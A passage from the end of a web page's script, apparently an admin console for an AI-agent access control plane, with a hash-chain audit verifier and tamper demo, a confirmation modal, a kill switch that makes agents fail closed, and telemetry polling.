    $('#tamper').onclick=()=>{const b=CHAIN[Math.min(4,CHAIN.length-1)];b.payload=b.payload.replace(/#\d+/,'#9999 (edited)');drawChain();toast('Record 4 altered. Run verify.')};
    $('#restore').onclick=()=>{CHAIN.forEach(b=>b.payload=b.orig);drawChain();$('#vres').innerHTML='';toast('Records restored')};
  }
};
function drawChain(bad=-1,ok=false){const el=$('#chain');if(!el)return;
  el.innerHTML=CHAIN.map(b=>`<div class="blk ${bad>=0?(b.i>=bad?'bad':'ok'):ok?'ok':''}"><b>Block ${b.i}</b><div class="p" title="${esc(b.payload)}">${esc(b.payload)}</div><div class="h">${b.hash.slice(0,20)}...</div></div>`).join('')}
async function verifyChain(){
  let prev='0'.repeat(64),bad=-1;
  for(const b of CHAIN){const h=await sha256(prev+b.payload);if(h!==b.hash){bad=b.i;break}prev=b.hash}
  drawChain(bad,bad<0);
  $('#vres').innerHTML=bad<0?`<div class="verdict ok">Chain verified. All ${CHAIN.length} blocks match their recorded hashes.</div>`:`<div class="verdict bad">Integrity failure at block ${bad}. Its content no longer matches the hash that block ${bad+1<CHAIN.length?bad+1:bad} committed to, so every block from ${bad} onward is untrusted.</div>`;
}

/* ---------- modal ---------- */
function confirmBox(title,body,cta,fn,danger){
  $('#modal').innerHTML=`<h3>${esc(title)}</h3><p style="margin:0;color:var(--muted)">${esc(body)}</p><div class="acts"><button class="btn" id="mc">Cancel</button><button class="btn ${danger?'danger':'primary'}" id="mo">${esc(cta)}</button></div>`;
  $('#modal').classList.add('on');$('#scrim').classList.add('on');$('#scrim').onclick=closeModal;$('#mc').onclick=closeModal;$('#mo').onclick=()=>{closeModal();fn()};$('#mo').focus();
}
function closeModal(){$('#modal').classList.remove('on');if(!$('#drawer').classList.contains('on'))$('#scrim').classList.remove('on')}

/* kill switch */
async function setKill(v){
  S.kill=v;
  $('#killBanner').classList.toggle('on',v);
  $('#killBtn').textContent=v?'Kill switch is on':'Kill switch';
  try {
    await fetch(S.api.base + '/api/v1/control/kill-switch', {
      method: 'POST',
      headers: {...getHeaders(), 'Content-Type': 'application/json'},
      body: JSON.stringify({enabled: v})
    });
  } catch(e) { console.error('Failed to update kill-switch on server:', e) }
  audit(v?'killswitch.on':'killswitch.off','console');
  if(S.view==='overview')render();
}
$('#killBtn').onclick=()=>S.kill?0:confirmBox('Turn on the kill switch?','Every agent fails closed immediately and no new grants are minted. Use this if you suspect compromise.','Turn on kill switch',()=>setKill(true),true);
$('#killOff').onclick=()=>confirmBox('Resume normal operation?','Agents re-sync policy and can request grants again.','Resume',()=>setKill(false));
$('#pauseBtn').onclick=()=>{S.paused=!S.paused;$('#pauseBtn').textContent=S.paused?'Resume stream':'Pause stream';if(S.view==='overview')render()};
$('#themeBtn').onclick=()=>{const r=document.documentElement,dark=(r.dataset.theme==='dark')||(!r.dataset.theme&&matchMedia('(prefers-color-scheme:dark)').matches);r.dataset.theme=dark?'light':'dark'};

/* ---------- live polling loop ---------- */
setInterval(()=>{
  S.grants.forEach(g=>{if(g.ttl>0)g.ttl--});
  if(S.view==='grants'&&S._gf)S._gf();
},1000);

// Poll live control plane every 3.5s
setInterval(()=>{
  if(!S.paused) fetchTelemetry();
},3500);

/* ---------- boot ---------- */
(async()=>{
  try {
    const savedToken = sessionStorage.getItem('bap_admin_token');
    if(savedToken) S.api.token = savedToken;
  } catch(e){}
  seedFallback();
  await buildChain();
  connUI();
  go('overview');
  await fetchTelemetry();
})();
</script>
</body>
</html>
